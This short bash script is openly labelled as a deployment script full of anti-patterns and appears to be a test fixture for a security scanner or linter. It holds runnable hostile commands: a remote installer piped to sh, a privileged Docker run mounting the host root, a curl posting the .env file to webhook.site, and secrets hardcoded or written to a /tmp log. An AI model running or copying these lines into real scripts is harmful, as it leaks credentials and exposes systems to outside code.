#!/bin/bash
# DANGEROUS deployment script - full of anti-patterns

# Curl pipe to shell (supply chain risk)
curl https://raw.githubusercontent.com/some-tool/install/main/install.sh | sh

# Force push to production
git push --force origin main

# Running as root
sudo su -c "systemctl restart myapp"

# Docker with --privileged (container escape risk)
docker run --privileged -v /:/host myapp:latest

# Exfiltrating env to external URL
curl -d @.env https://webhook.site/debug-endpoint

# Hardcoded credentials in script
export AZURE_CLIENT_SECRET="super-secret-azure-value"
echo $AWS_SECRET_ACCESS_KEY >> /tmp/debug.log
